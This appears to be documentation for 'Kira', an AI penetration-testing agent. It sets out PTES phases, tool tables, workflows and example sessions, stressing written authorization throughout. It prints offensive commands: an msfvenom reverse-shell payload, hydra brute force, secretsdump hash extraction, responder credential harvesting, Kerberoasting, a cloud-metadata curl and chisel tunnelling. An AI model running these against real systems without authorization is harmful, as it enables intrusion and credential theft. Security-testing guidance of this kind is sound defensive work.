# Complete Guide to Kira Agent (Cybersecurity)

**English** | [Portuguese](../pt/CYBERSEC.md)

---

## Table of Contents

1. [Overview](#overview)
2. [Persona and Ethics](#persona-and-ethics)
3. [PTES Methodology](#ptes-methodology)
4. [Available Tools](#available-tools)
5. [Workflows](#workflows)
6. [Practical Examples](#practical-examples)
7. [Report Format](#report-format)
8. [Limitations and Precautions](#limitations-and-precautions)
9. [MCP Integration](#mcp-integration)
10. [Quick Reference](#quick-reference)

---

## Overview

**Kira** is the cybersecurity agent of the AIOX OpenCode Adapter. She performs complete pentests, vulnerability scanning, security auditing, and threat analysis following industry-recognized methodologies.

### Capabilities

| Area | Level | Description |
|------|-------|-------------|
| Reconnaissance | Expert | Passive and active information gathering |
| Web App Pentest | Expert | Web application testing |
| Network Pentest | Expert | Network infrastructure testing |
| Exploitation | Expert | Vulnerability exploitation |
| Post-Exploitation | Advanced | Post-exploitation and pivoting |
| Active Directory | Intermediate | AD environment testing |
| Cloud Security | Intermediate | AWS/Azure/GCP testing |
| Reporting | Expert | Complete documentation with CVSS |

### Current Version

- **Agent:** Kira (Cybersecurity Analyst)
- **Version:** 3.0.0
- **Mode:** primary
- **Color:** #ff0000

---

## Persona and Ethics

### Persona

Kira is a professional penetration tester and security analyst. She strictly follows:

1. **Authorization first** - Never tests without explicit authorization
2. **Defined scope** - Respects authorized boundaries
3. **Complete documentation** - Records everything for the report
4. **Professional conduct** - Follows responsible disclosure practices
5. **Legal compliance** - Complies with local and international laws

### Ethical Principles

```
1. NEVER test without explicit written authorization
2. Respect authorized scope
3. DO NOT modify files without permission
4. DO NOT execute exploits without approval
5. Document all findings
6. Provide remediation recommendations
7. Follow responsible disclosure
```

---

## PTES Methodology

Kira follows the **Penetration Testing Execution Standard (PTES)**:

### Phase 1: Reconnaissance (Passive)

**Objective:** Gather information without touching the target.

**Tools:**
- `subfinder` - Subdomain enumeration
- `amass` - Advanced enumeration
- `gau` - Historical URLs
- `waybackurls` - Wayback Machine URLs
- `theharvester` - Email and subdomain collection
- `recon-ng` - Reconnaissance framework
- `shodan` - Connected devices search
- `censys` - Certificate and host analysis

**Example:**
```bash
# Enumerate subdomains
subfinder -d example.com -o subdomains.txt

# Collect historical URLs
gau example.com -o urls.txt

# Search connected devices
shodan search "org:Example ssl.cert.subject.CN:example.com"
```

### Phase 2: Scanning (Active)

**Objective:** Map live hosts, open ports, services, and technologies.

**Tools:**
- `nmap` - Port and service scanning
- `masscan` - High-speed scanning
- `rustscan` - Fast Rust-based scanning
- `httpx` - Web technology detection
- `whatweb` - Web fingerprinting
- `wafw00f` - WAF detection

**Example:**
```bash
# Basic scan
nmap -sV -sC example.com

# Fast scan
masscan 192.168.1.0/24 -p 80,443,8080 --rate=1000

# Technology detection
httpx -target example.com -tech-detect
```

### Phase 3: Enumeration

**Objective:** Find hidden paths, parameters, and vulnerabilities.

**Tools:**
- `ffuf` - Directory fuzzing
- `dirb` - Directory enumeration
- `dirsearch` - Advanced search
- `gobuster` - Parallel enumeration
- `nikto` - Web vulnerability scanning
- `nuclei` - Template-based scanning
- `arjun` - Parameter discovery
- `paramspider` - Parameter mining

**Example:**
```bash
# Enumerate directories
ffuf -u https://example.com/FUZZ -w wordlist.txt

# Vulnerability scanning
nuclei -target example.com -severity critical,high
```

### Phase 4: Vulnerability Analysis

**Objective:** Identify and validate vulnerabilities.

**Tools:**
- `nuclei` - Vulnerability templates
- `sqlmap` - SQL injection
- `dalfox` - XSS
- `nikto` - Web vulnerabilities
- `burpsuite` - Manual analysis
- `wpscan` - WordPress vulnerabilities
- `droopescan` - Drupal vulnerabilities

**Example:**
```bash
# SQL Injection test
sqlmap -u "https://example.com/page?id=1" --batch

# XSS test
dalfox url "https://example.com/search?q=test"
```

### Phase 5: Exploitation (with authorization)

**Objective:** Confirm vulnerabilities with safe exploitation.

**Tools:**
- `msfconsole` - Metasploit Framework
- `msfvenom` - Payload generation
- `sqlmap` - SQL injection exploitation
- `hydra` - Brute force
- `searchsploit` - Exploit search

**Example:**
```bash
# Login brute force
hydra -l admin -P wordlist.txt example.com http-post-form

# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe
```

### Phase 6: Post-Exploitation

**Objective:** Assess impact, pivot to other systems.

**Tools:**
- `impacket-scripts` - Complete Windows suite
- `evil-winrm` - Windows remote management
- `chisel` - Tunneling
- `ligolo-ng` - Pivoting
- `linpeas` - Linux privilege escalation
- `winpeas` - Windows privilege escalation

**Example:**
```bash
# Extract hashes
secretsdump.py administrator:password@192.168.1.100

# Remote access
evil-winrm -i 192.168.1.100 -u admin -p password
```

### Phase 7: Active Directory (if applicable)

**Objective:** Map AD environment, extract credentials, escalate to domain admin.

**Tools:**
- `bloodhound-python` - AD mapping
- `ldapdomaindump` - LDAP enumeration
- `kerbrute` - Kerberos testing
- `impacket` - AD attacks
- `responder` - Credential harvesting

**Example:**
```bash
# Map AD
bloodhound-python -d example.com -u user -p password -ns 192.168.1.1

# Kerberoasting
impacket-GetNPUsers example.com/ -usersfile users.txt -format hashcat
```

### Phase 8: Cloud Security (if applicable)

**Objective:** Assess cloud configuration, find misconfigurations.

**Tools:**
- `pacu` - AWS exploitation
- `scout-suite` - Multi-cloud assessment
- `prowler` - AWS security
- `roadtools` - Azure security
- `trivy` - Container scanning
- `kube-hunter` - Kubernetes security

**Example:**
```bash
# Enumerate AWS resources
pacu --module iam__enum_users --force

# Scan container
trivy image myapp:latest
```

### Phase 9: Reporting

**Objective:** Document all findings with CVSS scores and remediation.

**Format:** See [Report Format](#report-format) section

---

## Available Tools

### MCPs (when available)

| MCP | Tools | Description |
|-----|-------|-------------|
| **HexStrike AI** | `hexstrike_*` | 100+ pentesting tools |
| **Pentest MCP** | `pentest-mcp_*` | Additional tools |

### CLI Tools (always available)

#### Reconnaissance

| Tool | Type | Description |
|------|------|-------------|
| `subfinder` | Subdomains | Passive enumeration |
| `amass` | Subdomains | Advanced enumeration |
| `gau` | URLs | Historical URLs |
| `waybackurls` | URLs | Wayback Machine |
| `theharvester` | OSINT | Emails and subdomains |
| `recon-ng` | Framework | Complete framework |
| `shodan` | API | Connected devices |
| `censys` | API | Certificates and hosts |
| `dnsrecon` | DNS | DNS enumeration |
| `fierce` | DNS | DNS recon |
| `dnsenum` | DNS | DNS enumeration |
| `sublist3r` | Subdomains | Subdomains via search |

#### Web Application

| Tool | Type | Description |
|------|------|-------------|
| `ffuf` | Fuzzing | Directory fuzzing |
| `dirb` | Enumeration | Directories and files |
| `dirsearch` | Enumeration | Advanced search |
| `gobuster` | Enumeration | Parallel enumeration |
| `nikto` | Vulnerabilities | Web vulnerabilities |
| `nuclei` | Vulnerabilities | Templates |
| `sqlmap` | Injection | SQL injection |
| `dalfox` | Injection | XSS |
| `commix` | Injection | Command injection |
| `arjun` | Parameters | Parameter discovery |
| `paramspider` | Parameters | Mining |
| `jwt_tool` | JWT | Token analysis |
| `kiterunner` | API | API enumeration |
| `gopherus` | SSRF | Payload generation |
| `sstimap` | SSTI | Template injection |
| `wpscan` | CMS | WordPress |
| `droopescan` | CMS | Drupal |
| `cmseek` | CMS | Joomla |

#### Network Pentesting

| Tool | Type | Description |
|------|------|-------------|
| `nmap` | Scanning | Ports and services |
| `masscan` | Scanning | High-speed |
| `rustscan` | Scanning | Fast Rust-based |
| `hydra` | Brute Force | Login brute force |
| `medusa` | Brute Force | Parallel |
| `bettercap` | MITM | Man-in-the-Middle |
| `mitmproxy` | MITM | Proxy intercept |
| `responder` | Auth | Credential harvesting |
| `ntlmrelayx` | Relay | NTLM relay |
| `tcpdump` | Sniffing | Packet capture |
| `tshark` | Sniffing | Wireshark CLI |
| `ngrep` | Sniffing | Grep on packets |
| `hping3` | Packets | Custom packets |
| `nping` | Packets | Network probing |
| `enum4linux` | SMB | SMB enumeration |
| `smbclient` | SMB | Share access |
| `rpcclient` | RPC | RPC enumeration |

#### Exploitation

| Tool | Type | Description |
|------|------|-------------|
| `msfconsole` | Framework | Metasploit |
| `msfvenom` | Payloads | Payload generation |
| `searchsploit` | Exploit DB | Exploit search |
| `ropper` | ROP | ROP gadgets |
| `one_gadget` | Gadgets | One-shot RCE |
| `pwntools` | Framework | Exploit development |
| `veil` | Evasion | Antivirus evasion |
| `shellter` | Injection | Shell injection |
| `unicorn` | Payloads | Payloads |

#### Post-Exploitation

| Tool | Type | Description |
|------|------|-------------|
| `impacket-*` | Suite | Windows attacks |
| `secretsdump` | Dump | Hash extraction |
| `psexec` | Exec | Remote execution |
| `wmiexec` | Exec | WMI execution |
| `smbexec` | Exec | SMB execution |
| `evil-winrm` | Windows | Remote management |
| `chisel` | Tunneling | HTTP tunnel |
| `ligolo-ng` | Pivoting | Network pivot |
| `linpeas` | Privesc | Linux privilege escalation |
| `linenum` | Enum | Linux enumeration |
| `linux-exploit-suggester` | Suggester | Linux exploits |
| `winpeas` | Privesc | Windows privilege escalation |
| `powerup` | Privesc | PowerShell privesc |
| `jaws` | Privesc | Just Another Windows (Enum) |
| `sherlock` | Username | Social media username hunt |

#### Active Directory

| Tool | Type | Description |
|------|------|-------------|
| `bloodhound-python` | Enumeration | AD graph |
| `ldapdomaindump` | LDAP | LDAP dump |
| `kerbrute` | Kerberos | Kerberos brute force |
| `responder` | Auth | Credential harvesting |
| `ntlmrelayx` | Relay | NTLM relay |

#### Cloud Security

| Tool | Type | Description |
|------|------|-------------|
| `pacu` | AWS | AWS exploitation |
| `scout-suite` | Multi-cloud | Cloud assessment |
| `prowler` | AWS | AWS security |
| `roadtools` | Azure | Azure security |
| `trivy` | Containers | Container scanning |
| `kube-hunter` | Kubernetes | K8s security |

#### Reverse Engineering

| Tool | Type | Description |
|------|------|-------------|
| `gdb` | Debugging | GNU Debugger |
| `python3` | Scripting | Python scripts |
| `strings` | Analysis | String extraction |
| `xxd` | Hex | Hex dump |
| `hexdump` | Hex | Hex dump |
| `readelf` | ELF | ELF analysis |
| `objdump` | Disasm | Disassembly |
| `nm` | Symbols | Symbol table |
| `ldd` | Libraries | Library dependencies |
| `strace` | Trace | System call trace |
| `ltrace` | Trace | Library call trace |

#### System

| Tool | Type | Description |
|------|------|-------------|
| `cat` | File | Read files |
| `ls` | Directory | List directories |
| `pwd` | Path | Current directory |
| `id` | User | Current user |
| `whoami` | User | Username |
| `uname` | System | System info |
| `ifconfig` | Network | Interfaces |
| `ip` | Network | Interfaces (modern) |
| `netstat` | Network | Connections |
| `ss` | Network | Connections (modern) |
| `ps` | Process | Processes |
| `top` | Process | Top processes |
| `find` | Search | File search |
| `locate` | Search | Indexed search |
| `which` | Search | Locate commands |
| `file` | Analysis | File type |

---

## Workflows

### Workflow 1: Quick Assessment

```
1. Quick reconnaissance
   → subfinder -d target.com
   → httpx -target target.com

2. Scanning
   → nmap -sV -sC target.com
   → nuclei -target target.com

3. Basic report
   → List of found vulnerabilities
```

### Workflow 2: Complete Pentest

```
1. Passive reconnaissance
   → subfinder, gau, waybackurls, theharvester

2. Active scanning
   → nmap, masscan, httpx, whatweb, wafw00f

3. Enumeration
   → ffuf, dirsearch, nikto, nuclei

4. Vulnerability analysis
   → nuclei, sqlmap, dalfox, nikto

5. Exploitation (with authorization)
   → msfconsole, hydra, sqlmap

6. Post-exploitation
   → impacket, evil-winrm, chisel

7. Report
   → Complete documentation with CVSS
```

### Workflow 3: Web App Pentest

```
1. Spider/crawl
   → katana, hakrawler

2. Directory enumeration
   → ffuf, gobuster, dirsearch

3. Injection testing
   → sqlmap, dalfox, commix

4. Manual testing
   → Burp Suite Community

5. Automated scanning
   → OWASP ZAP

6. Report
   → Detailed with evidence
```

### Workflow 4: Network Pentest

```
1. Host discovery
   → nmap, masscan

2. Service enumeration
   → nmap scripts

3. Vulnerability testing
   → nuclei

4. Brute force
   → hydra, medusa

5. Misconfiguration testing
   → enum4linux, smbclient

6. Report
   → Complete with evidence
```

### Workflow 5: Active Directory Pentest

```
1. User enumeration
   → kerbrute, ldapdomaindump

2. AD mapping
   → bloodhound-python

3. Kerberos testing
   → impacket (GetNPUsers, GetUserSPNs)

4. Credential harvesting
   → responder, ntlmrelayx

5. Privilege escalation
   → impacket (secretsdump)

6. Report
   → Detailed with attack paths
```

### Workflow 6: Cloud Security

```
1. Resource enumeration
   → pacu, roadtools

2. Misconfiguration checking
   → scout-suite, prowler

3. Container scanning
   → trivy, kube-hunter

4. Metadata attack testing
   → curl http://169.254.169.254/latest/meta-data/

5. Report
   → Insecure configurations found
```

---

## Practical Examples

### Example 1: Basic Pentest

```
User: @cybersec Do a basic pentest on example.com

Kira executes:

1. Confirms authorization
   → "Do you have authorization to test example.com?"

2. Reconnaissance
   → subfinder -d example.com
   → httpx -target example.com

3. Scanning
   → nmap -sV -sC example.com
   → nuclei -target example.com

4. Enumeration
   → ffuf -u https://example.com/FUZZ -w wordlist.txt

5. Report
   → 8 vulnerabilities found
   → 1 critical, 3 high, 4 medium
   → Remediation recommendations
```

### Example 2: Complete Web App Pentest

```
User: @cybersec Do a complete pentest on web app app.example.com

Kira executes:

1. Authorization confirmation
   → Verifies scope and restrictions

2. Passive reconnaissance
   → subfinder -d app.example.com
   → gau app.example.com
   → theharvester -d app.example.com -b google

3. Active scanning
   → nmap -sV -sC app.example.com
   → whatweb app.example.com
   → wafw00f app.example.com

4. Enumeration
   → katana -u https://app.example.com -d 3
   → ffuf -u https://app.example.com/FUZZ -w common.txt
   → arjun -u https://app.example.com/page

5. Injection testing
   → sqlmap -u "https://app.example.com/page?id=1" --batch
   → dalfox url "https://app.example.com/search?q=test"
   → commix -u "https://app.example.com/cmd?input=test"

6. Manual analysis
   → Burp Suite: Intercept and repeater
   → ZAP: Automated scanning

7. Detailed report
   → 23 vulnerabilities found
   → 2 critical, 7 high, 10 medium, 4 low
   → Evidence for each finding
   → Step-by-step reproduction
   → Specific remediation
```

### Example 3: Network Pentest

```
User: @cybersec Do a pentest on network 192.168.1.0/24

Kira executes:

1. Authorization
   → Verifies authorization for the network

2. Host discovery
   → nmap -sn 192.168.1.0/24
   → Result: 15 active hosts

3. Port scanning
   → nmap -sV -sC 192.168.1.0/24
   → Result: 45 open ports

4. Service enumeration
   → enum4linux 192.168.1.100
   → smbclient -L //192.168.1.100

5. Vulnerability testing
   → nuclei -l hosts.txt
   → hydra -L users.txt -P pass.txt 192.168.1.100 ssh

6. Report
   → Complete network map
   → Identified services
   → Found vulnerabilities
   → Obtained credentials (if any)
```

---

## Report Format

### Report Structure

```markdown
# Pentest Report - [Target]

## Executive Summary
- Target tested
- Test scope
- Execution period
- Overall risk level
- Key findings

## Technical Details

### Vulnerabilities Found

#### [CVSS 9.0-10.0] Critical
- **Vulnerability:** [Name]
- **CVSS:** [Score]
- **Vector:** [Complexity, Privileges, Interaction]
- **Description:** [Detailed description]
- **Evidence:** [Command, Screenshot, Output]
- **Reproduction:** [Step-by-step]
- **Remediation:** [How to fix]

#### [CVSS 7.0-8.9] High
...

#### [CVSS 4.0-6.9] Medium
...

#### [CVSS 0.1-3.9] Low
...

### General Recommendations
1. [Recommendation 1]
2. [Recommendation 2]
3. [Recommendation 3]

### Appendices
- Tool output
- Raw data
- References
```

### CVSS Classification

| Range | Severity | Color |
|-------|----------|-------|
| 9.0 - 10.0 | Critical | Red |
| 7.0 - 8.9 | High | Orange |
| 4.0 - 6.9 | Medium | Yellow |
| 0.1 - 3.9 | Low | Green |

---

## Limitations and Precautions

### Authorization

```
CRITICAL: NEVER test without explicit written authorization.

Before any test:
1. Obtain written authorization from target owner
2. Define test scope
3. Define allowed times
4. Define restrictions (don't take down services, etc.)
5. Have emergency contact
```

### Scope

```
Always verify:
1. Which IPs/domains are in scope
2. Which ports/services can be tested
3. Which techniques are allowed
4. What are the restrictions
5. What is the disclosure process
```

### Precautions

```
1. DO NOT take down production services
2. DO NOT execute destructive exploits
3. DO NOT modify data without authorization
4. DO NOT access third-party data
5. DO NOT perform denial of service attacks
6. Keep logs of all actions
7. Immediately report critical vulnerabilities
```

### Tools Not Installed

```
If a tool is not installed:
1. Check if it's in PATH
2. Check if it can be installed
3. Use available alternative
4. Document in failure
5. Don't break the workflow
```

---

## MCP Integration

### HexStrike AI

```python
# hexstrike_* tools
hexstrike_nmap_scan(target, scan_type, ports)
hexstrike_nuclei_scan(target, severity, tags)
hexstrike_sqlmap_scan(url, data)
hexstrike_subfinder_scan(domain)
hexstrike_amass_scan(domain, mode)
hexstrike_hydra_attack(target, service, username, password_file)
```

### Pentest MCP

```python
# pentest-mcp_* tools
pentest-mcp_nmap_scan(target, scan_type, ports)
pentest-mcp_nikto_scan(target, port)
pentest-mcp_sqlmap_test(url, parameter)
pentest-mcp_hydra_brute(target, service, username, password)
pentest-mcp_subfinder_scan(domain)
```

### Using with MCPs

```
1. Check if MCP is available
2. Use MCP tools as primary
3. Use CLI as alternative
4. Document which tool was used
```

---

## Quick Reference

### Common Commands

```bash
# Reconnaissance
subfinder -d target.com -o subs.txt
gau target.com -o urls.txt
theharvester -d target.com -b google

# Scanning
nmap -sV -sC target.com
masscan 192.168.1.0/24 -p 80,443
httpx -target target.com -tech-detect

# Enumeration
ffuf -u https://target.com/FUZZ -w wordlist.txt
nuclei -target target.com
nikto -h target.com

# Injection
sqlmap -u "https://target.com/page?id=1" --batch
dalfox url "https://target.com/search?q=test"
commix -u "https://target.com/cmd?input=test"

# Brute Force
hydra -l admin -P wordlist.txt target.com http-post-form
medusa -h target.com -u admin -P wordlist.txt -M http

# Exploitation
msfconsole
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe
searchsploit apache 2.4

# Post-Exploitation
secretsdump.py admin:pass@192.168.1.100
evil-winrm -i 192.168.1.100 -u admin -p pass
chisel server --reverse
linpeas.sh

# Active Directory
bloodhound-python -d target.com -u user -p pass -ns 192.168.1.1
responder -I eth0
impacket-GetNPUsers target.com/ -usersfile users.txt
```

### Summary Flow

```
1. Authorization → 2. Recon → 3. Scan → 4. Enum → 
5. Vuln Analysis → 6. Exploit → 7. Post-Exploit → 
8. AD (if applicable) → 9. Cloud (if applicable) → 
10. Report
```

---

## Next Steps

1. [Agent Guide](AGENTS.md)
2. [Troubleshooting](TROUBLESHOOTING.md)
3. [MCP Guide](MCP-GUIDE.md)
